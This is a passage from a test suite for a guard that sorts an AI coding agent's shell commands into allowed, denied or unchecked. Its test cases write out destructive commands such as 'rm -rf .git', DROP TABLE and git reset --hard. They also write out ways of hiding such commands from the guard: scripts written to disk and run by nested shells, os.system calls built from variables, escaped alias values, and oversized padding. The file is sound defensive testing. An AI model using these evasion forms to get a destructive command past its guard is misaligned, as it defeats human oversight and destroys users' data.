  expectAll(dir, 'allow', ['HOME=/tmp/x git st', 'GIT_CONFIG_GLOBAL=/tmp/x git st']);
  // Config given as on git's command line overrides the repository's: not read.
  expectAll(dir, 'unchecked', ['GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.st GIT_CONFIG_VALUE_0=x git st']);
});

test('round 4: a quoted column dropped by ALTER TABLE is refused', (t) => {
  const dir = reviewerRepo(t);
  expectAll(dir, 'deny', [`psql -c 'alter table t drop "Email"'`, `psql -c 'ALTER TABLE t DROP COLUMN "Email"'`]);
});

test('round 4: a line that costs the reader more than its budget is unchecked, never allowed', (t) => {
  const dir = reviewerRepo(t);
  const { readDestructive } = require('../bin/lib/destructive');
  const spent = readDestructive('echo a; echo b; rm -rf build', { cwd: dir, host: {}, deadline: Date.now() - 1 });
  assert.equal(spent.findings.length, 0);
  assert.ok(spent.unchecked.some((entry) => /time budget/.test(entry.reason)), JSON.stringify(spent.unchecked));
  // Thousands of words in one command: the deadline is read inside the word loop too.
  const words = readDestructive(`rm ${'a.txt '.repeat(200000)}`, { cwd: dir, host: { exists: () => true, home: () => '/h' }, deadline: Date.now() + 1 });
  assert.equal(words.findings.length, 0);
  assert.ok(words.unchecked.some((entry) => /time budget/.test(entry.reason)), JSON.stringify(words.unchecked));
  // Repetition: the same probe is answered once, and the call stays bounded.
  const started = Date.now();
  const repeated = run(dir, 'rm build; '.repeat(2000));
  assert.ok(Date.now() - started < 20000, `${Date.now() - started} ms`);
  assert.notEqual(repeated.decision, 'deny', repeated.reason);
  const shells = run(dir, `psql <<'EOF'\n${'\\! echo hi\n'.repeat(9000)}\\! rm -rf build\nEOF`);
  assert.notEqual(shells.decision, 'allow');
});

// --- series 2, review round 1 -----------------------------------------------------------

// The repo above, plus `src/c.txt` (tracked, modified) and `src/d.js` (tracked, clean).
function globRepo(t) {
  const dir = repo(t);
  fs.mkdirSync(path.join(dir, 'src'));
  fs.writeFileSync(path.join(dir, 'src', 'c.txt'), 'one\n');
  fs.writeFileSync(path.join(dir, 'src', 'd.js'), 'one\n');
  fs.writeFileSync(path.join(dir, 'e.log'), 'untracked\n');
  git(dir, 'add', 'src');
  git(dir, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'src');
  fs.writeFileSync(path.join(dir, 'src', 'c.txt'), 'two\n');
  return dir;
}

test('series 2 round 1: a glob or brace naming a modified tracked file is refused', (t) => {
  const dir = globRepo(t);
  expectAll(dir, 'deny', ['rm *.txt', 'rm a.*', 'rm a.t?t', 'rm [a].txt', 'rm {a,b}.txt', 'unlink a.*', 'git rm -f *.txt', 'rm ./src/*', 'rm -f src/*.txt', 'rm {x,{a,y}}.txt', 'rm src/{c,d}.*']);
  // Clean, untracked or unmatched: allowed, as the literal path is.
  expectAll(dir, 'allow', ['rm b.*', 'rm build/*', 'rm *.log', 'rm src/*.js', 'rm {b,x}.txt', 'rm nothing*', 'rm src/{d,z}.js', 'git rm -f b.*']);
  assert.match(run(dir, 'rm *.txt').reason, /a\.txt/);
  // An expansion too big to list is unchecked, never allowed.
  expectAll(dir, 'unchecked', ['rm {a,b}{a,b}{a,b}{a,b}{a,b}{a,b}{a,b}.txt', 'rm {a,b}{c,d}{e,f}{g,h}{i,j}{k,l}{m,n}.txt']);
  // What bash leaves as written stays a literal word: an unclosed brace, a mixed range.
  const { readDestructive } = require('../bin/lib/destructive');
  const host = { exists: () => true, home: () => '/home/x' };
  const pathsOf = (command) => readDestructive(command, { cwd: dir, host }).findings.map((finding) => finding.check.paths);
  assert.deepEqual(pathsOf('rm {a,b'), [['{a,b']]);
  assert.deepEqual(pathsOf('rm {a}.txt {}'), [['{a}.txt', '{}']]);
  assert.deepEqual(pathsOf('rm x{1..b}'), [['x{1..b}']]);
  assert.deepEqual(pathsOf('rm x{c..a}'), [['xc', 'xb', 'xa']]);
  // A stepped range, or a word too long to expand, is unchecked.
  for (const command of ['rm x{1..9..2}', `rm {a,b}${'x'.repeat(5000)}`]) {
    assert.ok(readDestructive(command, { cwd: dir, host }).unchecked.some((entry) => /brace/.test(entry.reason)), command);
  }
  // A range: 29-03 already refuses a word with `..` near its policy file; never allowed.
  for (const command of ['rm f{1..500}.txt', 'rm a{1..3}.txt']) {
    assert.notEqual(run(dir, command).decision, 'allow', command);
  }
});

test('series 2 round 1: the frozen 29-03 reader and its shell reader are pinned to 3c90919', () => {
  const crypto = require('node:crypto');
  const pinned = { 'destructive-29-03.js': 'bin/lib/destructive.js', 'shell-writes-29-03.js': 'bin/lib/shell-writes.js' };
  const recorded = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures', 'guard-29-03-sources.json'), 'utf8'));
  for (const [file, was] of Object.entries(pinned)) {
    const text = fs.readFileSync(path.join(ROOT, 'bin', 'lib', file), 'utf8');
    // The header after `"use strict";`, and the one require that names the frozen shell reader.
    const body = text.replace(/^("use strict";\n)\n\/\/ FROZEN[^\n]*\n(?:\/\/[^\n]*\n)*/, '$1').replace('require("./shell-writes-29-03")', 'require("./shell-writes")');
    assert.equal(crypto.createHash('sha256').update(body).digest('hex'), recorded[was], `${file} is 3c90919's ${was}`);
  }
  // 29-03's judging (series 2 round 2): each block between the markers is 3c90919's guard.js lines.
  const judge = fs.readFileSync(path.join(ROOT, 'bin', 'lib', 'destructive-judge-29-03.js'), 'utf8');
  const blocks = [...judge.matchAll(/^\/\/ --- 3c90919 (bin\/lib\/guard\.js:[\d-]+) ---\n([\s\S]*?)(?=^\/\/ --- )/gm)];
  assert.deepEqual(blocks.map((block) => block[1]), ['bin/lib/guard.js:789', 'bin/lib/guard.js:792-793', 'bin/lib/guard.js:1129-1275']);
  for (const [, where, text] of blocks) {
    assert.equal(crypto.createHash('sha256').update(text).digest('hex'), recorded[where], `${where} is 3c90919's`);
  }
  const outside = judge.replace(/^\/\/ --- 3c90919[\s\S]*^\/\/ --- end of 3c90919 ---$/m, '');
  // Series 2 round 3: outside the blocks, nothing but comments, blank lines and these
  // lines (the requires, `use`, the export) — any other code fails, not only a `function`.
  const code = outside.split('\n').filter((line) => line.trim() !== '' && !/^\s*\/\//.test(line));
  assert.deepEqual(code, [
    '"use strict";',
    'const path = require("path");',
    'const { execFileSync } = require("child_process");',
    'let loadPolicy = null;',
    'const use = (loader) => {',
    '  loadPolicy = loader;',
    '};',
    'module.exports = { use, judgeDestructive, gitBudget };',
  ], 'no code of its own outside the frozen blocks but the requires, `use` and the export');
});

// A host with no spawn and nothing from this machine (home, PATH), so a reader's output
// on the corpus depends on the reader alone; the aliases are reviewerRepo's.
const REVIEWER_ALIASES = { nuke: 'reset --hard', zap: '!rm -rf build', st: 'status' };
function readerHost(dir) {
  return {
    exists: (file) => file !== null && fs.existsSync(file),
    readSmall: () => null,
    home: () => '/home/reviewer',
    onPath: () => false,
    gitAlias: (cwd, name) => ({ value: REVIEWER_ALIASES[name] || null }),
    gitTop: () => dir,
    // The shell reader's (shell-writes), with the same rule: nothing but this directory.
    realpath: (at) => at,
    realPathOf: (at) => at,
    isDirectory: (at) => fs.existsSync(at) && fs.statSync(at).isDirectory(),
    gitRoot: () => dir,
    readText: () => null,
  };
}

// What a reader said about one command, as a short hash, with the throwaway directory named `<repo>`.
function readerDigest(output, dir) {
  const text = JSON.stringify(output).split(dir).join('<repo>');
  return require('node:crypto').createHash('sha256').update(text).digest('hex').slice(0, 16);
}

// Series 3 round 1: the recorded outputs hold paths relative to the repository
// (`../../.env`, `cd /tmp`), recorded with it one level under /tmp on Linux. So the frozen
// readers are shown that repository at a fixed POSIX path, whatever and wherever the real
// directory is (a deep TMPDIR, macOS's /private/tmp, a Windows drive): their own code,
// byte for byte, loaded with `path.posix` for `path` and run as on Linux; only the host
// maps the virtual repository onto the real one, and nothing outside it exists but its parents.
const VIRTUAL_REPO = '/tmp/coding-flow-evasion-reviewer';
function virtualHost(dir) {
  const inside = (at) => at === VIRTUAL_REPO || at.startsWith(`${VIRTUAL_REPO}/`);
  const real = (at) => path.join(dir, ...at.slice(VIRTUAL_REPO.length).split('/').filter(Boolean));
  const parents = new Set(['/', '/tmp']);
  return {
    ...readerHost(VIRTUAL_REPO),
    exists: (file) => file !== null && (inside(file) ? fs.existsSync(real(file)) : parents.has(file)),
    isDirectory: (at) => (inside(at) ? fs.existsSync(real(at)) && fs.statSync(real(at)).isDirectory() : parents.has(at)),
  };
}
function posixFrozenReaders() {
  const Module = require('node:module');
  const files = ['../bin/lib/shell-writes-29-03', '../bin/lib/destructive-29-03'].map((file) => require.resolve(file));
  const cached = files.map((file) => require.cache[file]);
  const load = Module._load;
  files.forEach((file) => delete require.cache[file]);
  Module._load = function (request, parent, ...rest) {
    if ((request === 'path' || request === 'node:path') && parent && files.includes(parent.filename)) return path.posix;
    return load.call(this, request, parent, ...rest);
  };
  try {
    return { readDestructive: require(files[1]).readDestructive, shellWrites: require(files[0]).shellWrites };
  } finally {
    Module._load = load;
    files.forEach((file, i) => (cached[i] ? (require.cache[file] = cached[i]) : delete require.cache[file]));
  }
}
function asOnLinux(run) {
  const platform = Object.getOwnPropertyDescriptor(process, 'platform');
  Object.defineProperty(process, 'platform', { ...platform, value: 'linux' });
  try {
    return run();
  } finally {
    Object.defineProperty(process, 'platform', platform);
  }
}

test("series 2 round 1: the frozen reader's output on the reviewers' corpus is 29-03's, case by case", (t) => {
  const host = virtualHost(reviewerRepo(t));
  const { readDestructive, shellWrites } = posixFrozenReaders();
  const { outputs } = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures', 'guard-29-03-reader-outputs.json'), 'utf8'));
  const { cases } = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures', 'guard-29-03-decisions.json'), 'utf8'));
  assert.equal(outputs.length, cases.length);
  const moved = asOnLinux(() => cases.filter(([command], i) => readerDigest(readDestructive(command, { cwd: VIRTUAL_REPO, host }), VIRTUAL_REPO) !== outputs[i]));
  assert.deepEqual(moved.map(([command]) => command), []);
  // And the frozen shell reader's own reading of what each command writes.
  const { writes } = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures', 'guard-29-03-reader-outputs.json'), 'utf8'));
  const rewritten = asOnLinux(() => cases.filter(([command], i) => readerDigest(shellWrites(command, VIRTUAL_REPO, host, { trees: true }), VIRTUAL_REPO) !== writes[i]));
  assert.deepEqual(rewritten.map(([command]) => command), []);
});

test("series 2 round 1: the frozen readers read the guard's own 29-03 test commands as 3c90919 did", (t) => {
  const dir = reviewerRepo(t);
  const host = virtualHost(dir);
  const { readDestructive, shellWrites } = posixFrozenReaders();
  const { cases } = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures', 'guard-29-03-shell-corpus.json'), 'utf8'));
  assert.ok(cases.length > 1000, `${cases.length} commands`);
  const digest = (read) => {
    try {
      return readerDigest(read(), VIRTUAL_REPO);
    } catch (error) {
      return `throws ${error && error.name}`;
    }
  };
  const moved = asOnLinux(() => cases.filter(([command, reader, writes]) => digest(() => readDestructive(command, { cwd: VIRTUAL_REPO, host })) !== reader
    || digest(() => shellWrites(command, VIRTUAL_REPO, host, { trees: true })) !== writes));
  assert.deepEqual(moved.map(([command]) => command), []);
});

// --- series 2, review round 2 -----------------------------------------------------------

// Only `sub/c.txt` and `sub/deep/e.txt` are modified (tracked): git's own `*` crosses
// `/`, bash's does not, and 29-03 judged `git checkout -- '*.txt'` with git's.
function subRepo(t) {
  const dir = tmp(t);
  git(dir, 'init', '-q', '-b', 'main');
  fs.mkdirSync(path.join(dir, 'sub', 'deep'), { recursive: true });
  const write = (file, text) => fs.writeFileSync(path.join(dir, file), text);
  write('top.txt', 'one\n'); write('sub/c.txt', 'one\n'); write('sub/deep/e.txt', 'one\n');
  git(dir, 'add', '.');
  git(dir, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'init');
  write('sub/c.txt', 'two\n'); write('sub/deep/e.txt', 'two\n');
  return dir;
}

test("series 2 round 2: 29-03's findings are judged by 29-03's own code — no decision weaker than 3c90919's", (t) => {
  const recorded = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures', 'guard-29-03-decisions-round2.json'), 'utf8'));
  const rank = { allow: 0, unchecked: 1, deny: 2 };
  for (const [fixture, dir] of [['reviewer', reviewerRepo(t)], ['sub', subRepo(t)]]) {
    const weaker = recorded[fixture].filter(([command, before]) => rank[run(dir, command).decision] < rank[before]);
    assert.deepEqual(weaker, [], fixture);
  }
  // The P1 of the round: each was unchecked or allowed.
  expectAll(subRepo(t), 'deny', ["git checkout -- '*.txt'", "git restore '*.txt'", "git checkout -- 's*'", "git restore '*'", "git rm -f '*.txt'", 'rm sub/*.txt']);
  expectAll(subRepo(t), 'allow', ['rm *.txt', 'rm top.txt']);
});

test('series 2 round 2: a git error is no answer, and a pathspec word cannot empty the check', (t) => {
  const dir = reviewerRepo(t);
  expectAll(dir, 'deny', [
    // A path outside the repository made git fail, read as clean.
    'rm *.txt /etc/hostname', 'unlink a.txt /etc/hostname', 'git rm -f a.txt /etc/hostname',
    // `{,}` is no word; `:(bogus)` is a file name for rm.
    'rm -f a.txt {,}', "rm -f a.txt ':(bogus)x'",
    // git's exclude magic in a word bash hands rm as a file name.
    "rm a.txt ':!a.txt'", 'rm a.txt :^a.txt', "rm a.txt ':(exclude)a.txt'",
    // git rm's own pathspecs reach git without an existence check.
    'git rm -f :/a.txt', "git rm -f ':(top)a.txt'", "git rm -f -- ':(glob)*.txt'",
  ]);
  expectAll(dir, 'allow', ['rm ../a.txt', 'rm ~/nothing-here.txt', 'rm -- -a.txt', 'rm b.txt /etc/hostname', 'git rm -f b.txt']);
  // Outside any repository: nothing tracked to lose.
  const plain = tmp(t);
  fs.writeFileSync(path.join(plain, 'x.txt'), 'x');
  expectAll(plain, 'allow', ['rm x.txt', 'rm *.txt', 'git rm -f x.txt']);
});

// --- series 2 round 3 -------------------------------------------------------------------

// A primary checkout `locked/` (subRepo's layout: sub/c.txt and sub/deep/e.txt modified,
// top.txt clean) with a linked worktree `wt/` beside it.
function linkedLayout(t) {
  const base = tmp(t);
  const locked = path.join(base, 'locked');
  fs.mkdirSync(locked);
  git(locked, 'init', '-q', '-b', 'main');
  fs.mkdirSync(path.join(locked, 'sub', 'deep'), { recursive: true });
  const write = (file, text) => fs.writeFileSync(path.join(locked, file), text);
  write('top.txt', 'one\n'); write('sub/c.txt', 'one\n'); write('sub/deep/e.txt', 'one\n');
  git(locked, 'add', '.');
  git(locked, '-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'init');
  write('sub/c.txt', 'two\n'); write('sub/deep/e.txt', 'two\n');
  const wt = path.join(base, 'wt');
  git(locked, 'worktree', 'add', '-q', '-b', 'story', wt);
  return { base, locked, wt };
}

test("series 2 round 3: a path in another repository is checked in that repository", (t) => {
  const { locked, wt } = linkedLayout(t);
  expectAll(wt, 'deny', [
    'rm ../locked/sub/c.txt',
    `rm ${locked}/sub/c.txt`,
    'unlink ../locked/sub/deep/e.txt',
    'rm ../locked/sub/*.txt',
    `rm -f ${locked}/sub/deep/*.txt`,
    'rm top.txt ../locked/sub/c.txt',
    'cd ../locked && rm sub/c.txt',
  ]);
  // Clean or missing files of the other repository are not lost.
  expectAll(wt, 'allow', ['rm ../locked/top.txt', `rm ${locked}/top.txt`, 'rm ../locked/nothing.txt', 'rm top.txt']);
  // A repository git will not answer for is no answer, never clean.
  fs.writeFileSync(path.join(locked, '.git', 'HEAD'), 'garbage\n');
  const result = run(wt, 'rm ../locked/sub/c.txt');
  assert.notEqual(result.decision, 'allow', result.reason);
});

test('series 2 round 3: a path through a symlinked directory is not answered from the index', (t) => {
  const dir = subRepo(t);
  fs.symlinkSync('sub', path.join(dir, 'link'));
  for (const command of ['rm link/c.txt', 'rm link/deep/e.txt', 'rm link/*.txt', 'unlink link/c.txt']) {
    assert.notEqual(run(dir, command).decision, 'allow', command);
  }
  expectAll(dir, 'deny', ['rm link/c.txt', 'rm link/*.txt']);
  // A symlinked directory that points into another repository.
  const { wt } = linkedLayout(t);
  fs.symlinkSync('../locked/sub', path.join(wt, 'ext'));
  expectAll(wt, 'deny', ['rm ext/c.txt', 'rm ext/deep/e.txt']);
  // The clean file through the link stays allowed.
  expectAll(dir, 'allow', ['rm link/../top.txt']);
});

test('series 2 round 1: a command longer than the guard reads is refused, never allowed', (t) => {
  const dir = repo(t);
  const padded = `rm -rf .git; # ${'x'.repeat(256 * 1024)}`;
  const result = run(dir, padded);
  assert.equal(result.decision, 'deny', result.reason);
  assert.match(result.reason, /256 KB/);
  expectAll(dir, 'deny', [`echo ${'y'.repeat(300 * 1024)}`]);
  expectAll(dir, 'allow', [`echo ${'y'.repeat(200 * 1024)}`]);
  // Measured in UTF-8 bytes: 140 K characters of two bytes each are past the cap.
  expectAll(dir, 'deny', [`echo ${'é'.repeat(140 * 1024)}`]);
});

// --- criterion 5: one table of what the guard does not read ------------------------------

// 29-03's plan.md, D9 and D9 (extended): the forms it said it does not read.
const D9_FORMS = [
  'git push --delete', '--mirror', 'git pull', 'find -delete', 'a heredoc fed to `psql`',
  'npm run <script>', 'mysql -e', 'docker compose down -v', 'PowerShell',
  'npx rimraf', 'rsync --delete', 'shutil.rmtree', 'git update-ref -d', 'git reflog expire',
  'git gc --prune=now', 'git filter-branch', 'git rm -rf',
];

function unreadTable() {
  const doc = fs.readFileSync(path.join(ROOT, 'docs', 'rules-and-limits.md'), 'utf8');
  const start = doc.indexOf('### Destructive commands the guard does not read');
  assert.notEqual(start, -1, 'rules-and-limits has the table of unread destructive forms');
  const end = doc.indexOf('\n#', start + 10);
  return doc.slice(start, end === -1 ? undefined : end);
}

test('rules-and-limits: one table names every unread form with what covers it', () => {
  const table = unreadTable();
  const rows = table.split('\n').filter((line) => line.startsWith('|') && !/^\|\s*-/.test(line)).slice(1);
  assert.ok(rows.length >= D9_FORMS.length / 2, 'the table has rows');
  for (const row of rows) {
    const cells = row.split('|').slice(1, -1).map((cell) => cell.trim());
    assert.equal(cells.length, 3, `three columns: ${row}`);
    assert.ok(cells[2].length > 0, `each row names what covers it: ${row}`);
  }
  for (const form of D9_FORMS) {
    assert.ok(table.includes(form), `the table names 29-03's D9 form ${form}`);
  }
  // This story's own limits.
  for (const form of ['python script.py', 'interpreter API', 'base64', 'git submodule foreach', 'core.hooksPath', 'make -f', 'rm *.txt', 'symlink', 'case-insensitive', 'is dangerous']) {
    assert.ok(table.includes(form), `the table names ${form}`);
  }
});

test("rules-and-limits: the D9 list above is 29-03's own (while its plan is in the checkout)", (t) => {
  const plan = path.join(ROOT, 'epics', 'epic-29-what-the-agent-cannot-fake', 'story-29-03-destructive-commands-wait-for-the-human', 'plan.md');
  if (!fs.existsSync(plan)) {
    t.skip('29-03 archived: the list above is the record');
    return;
  }
  const text = fs.readFileSync(plan, 'utf8').replace(/\s+/g, ' ');
  const between = (from, to) => text.slice(text.indexOf(from), text.indexOf(to, text.indexOf(from)));
  const d9 = between('**D9 — Out', '**D10') + between('**D9 (extended)', '###');
  for (const form of D9_FORMS) {
    assert.ok(d9.includes(form), `${form} is in 29-03's D9`);
  }
  // And the other way: every form 29-03's D9 names (in backticks) is in the list above.
  const named = [...d9.matchAll(/`([^`]+)`/g)].map((match) => match[1]);
  assert.ok(named.length >= 15, `29-03's D9 names its forms: ${named.length}`);
  for (const form of named) {
    assert.ok(D9_FORMS.some((listed) => listed.includes(form) || form.includes(listed)), `29-03's D9 form ${form} is in the list`);
  }
});

// --- series 3 round 2: rules, not spellings ------------------------------------------------

test('series 3 round 2: a file written on the line and run by a nested shell or interpreter is read', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    `echo 'rm -rf build' > x.sh && bash -c ./x.sh`,
    `echo 'rm -rf build' > x.sh && sh -c 'bash x.sh'`,
    `echo 'rm -rf build' > x.sh && bash -c '. ./x.sh'`,
    `cat > x.sh <<'EOF'\nrm -rf build\nEOF\nbash -c 'bash x.sh'`,
    `echo 'rm -rf build' > x.sh && node -e 'require("child_process").execSync("sh x.sh")'`,
    // A glob or an expansion that can name a file the line wrote.
    `echo 'rm -rf build' > x.sh && bash x.s?`,
    `echo 'rm -rf build' > x.sh && bash ./*.sh`,
    `echo 'rm -rf build' > x.sh && F=x.sh; bash "$F"`,
  ]);
  expectAll(dir, 'allow', [
    `echo 'echo hello' > x.sh && bash -c ./x.sh`,
    `echo 'echo hello' > x.sh && sh -c 'bash x.sh'`,
    // Nothing written: a glob or a variable naming the script is not this rule's business.
    'bash scripts/*.sh',
    'bash "$SCRIPT"',
  ]);
});

test('series 3 round 2: an unquoted word with backslash escapes is read as its quoted form', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    String.raw`git config alias.x !rm\ -rf\ build`,
    String.raw`git config alias.x \!git\ reset\ --hard`,
    String.raw`git config alias.x reset\ --hard`,
    String.raw`python3 -c import\ os\;os.system\(\"rm\ -rf\ build\"\)`,
    String.raw`node -e require\(\"child_process\"\).execSync\(\"rm\ -rf\ build\"\)`,
  ]);
  expectAll(dir, 'allow', [
    String.raw`git config alias.lg log\ --oneline`,
    String.raw`python3 -c print\(1\)`,
  ]);
});

test('series 3 round 2: code, an alias value or SQL given as an expansion is unchecked', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    `C='import os; os.system("rm -rf build")'; python3 -c "$C"`,
    `python3 -c "$(echo 'import os; os.system("rm -rf build")')"`,
    'python3 -c "`cat code.py`"',
    `C='x'; node -e "$C"`,
    `C='x'; perl -e"$C"`,
    `python3 -c "\${CODE}"`,
    `A='!rm -rf build'; git config alias.x "$A"`,
    'git config alias.x "$A"',
    `Q='DROP TABLE x'; psql -c "$Q"`,
    'psql -c "$(cat q.sql)"',
  ]);
  // Single quotes keep the dollar literal: code that uses `$` is read as written.
  expectAll(dir, 'allow', [
    `perl -e 'my $x = 1; print $x'`,
    `ruby -e 'puts $0'`,
    `python3 -c "print('\\$HOME')"`,
    `psql -c 'select $1'`,
  ]);
});

test('series 3 round 2: everyday commands with an expansion outside the code position stay allowed', (t) => {
  const dir = repo(t);
  expectAll(dir, 'allow', [
    'npm test -- "$ARGS"',
    'git commit -m "$MSG"',
    'python3 script.py "$IN"',
    'node build.js --out "$OUT_DIR"',
    'git log --since="$SINCE" --oneline',
    'psql -d "$DATABASE_URL" -c "select 1"',
    'python3 -c "print(1)" "$IN"',
    'git config user.email "$EMAIL"',
    'echo "$HOME" && ls "$PWD"',
    'perl -ne "print if /x/" "$FILE"',
  ]);
});

// --- series 3 round 3: an expansion is unchecked only when it can hide the code ---------------

test('series 3 round 3: a plain environment variable inside interpreter code or SQL is read as written', (t) => {
  const dir = repo(t);
  expectAll(dir, 'allow', [
    `python3 -c "print('$HOME')"`,
    `python3 -c "print(\\"$HOME\\")"`,
    'psql -c "SELECT * FROM users WHERE id = $ID"',
  ]);
  // Still read: a destructive literal next to the variable is refused, as on develop.
  expectAll(dir, 'deny', ['psql -c "DROP TABLE $T"']);
});

test('series 3 round 3: code or SQL that starts with, substitutes or uses a variable set on the line is unchecked', (t) => {
  const dir = repo(t);
  expectAll(dir, 'unchecked', [
    `C='rm -rf build'; python3 -c "import os; os.system('$C')"`,
    `export C='rm -rf build' && python3 -c "import os; os.system('$C')"`,
    `python3 -c "import os; os.system('$(echo rm -rf build)')"`,
    'python3 -c "import os; os.system(\'`echo rm -rf build`\')"',
    `python3 -c "import os; os.system('\${X:-rm -rf build}')"`,
    `Q='x'; psql -c "SELECT 1; $Q"`,
    `psql -c "SELECT 1; $(cat q.sql)"`,
  ]);
  const reason = run(dir, `python3 -c "import os; os.system('$(echo rm -rf build)')"`).reason;
  assert.match(reason, /an expansion the guard cannot see/);
  assert.match(run(dir, `Q='DROP TABLE x'; psql -c "$Q"`).reason, /an expansion the guard cannot see/);
});

test('series 3 round 3: a glob in the run word is matched against the files the line wrote', (t) => {
  const dir = repo(t);
  expectAll(dir, 'allow', [
    'echo hi > out.txt && bash scripts/*.sh',
    'mkdir -p out && echo ok > out/a && bash ./scripts/ci-*.sh',
    'npm run build > build.log && bash "$DEPLOY_SCRIPT"',
    'echo hi > notes.md && python3 "$SCRIPT"',
  ]);
  expectAll(dir, 'unchecked', [
    `echo 'rm -rf build' > x.sh && bash [x]*.sh`,
    `echo 'rm -rf build' > ci-1.sh && bash ./ci-*.sh`,
    // An expansion: a script-like file written, a substitution, or a variable set on the line.
    `echo 'rm -rf build' > x.sh && bash "$S"`,
    `echo 'rm -rf build' > run && bash "$S"`,
    `echo 'rm -rf build' > out.txt && F=out.txt; bash "$F"`,
    `echo 'rm -rf build' > out.txt && bash "$(echo out.txt)"`,
  ]);
  assert.match(run(dir, `echo 'rm -rf build' > x.sh && bash x.s?`).reason, /an expansion the guard cannot see/);
});

test("series 3 round 3: psql's $'…' SQL is shown and read decoded", (t) => {
  const dir = repo(t);
  const result = run(dir, "psql -c $'DROP TABLE x'");
  assert.equal(result.decision, 'deny');
  assert.match(result.reason, /`psql -c 'DROP TABLE x'`/);
  expectAll(dir, 'deny', ["psql -c $'DROP\\x20TABLE x'"]);
});
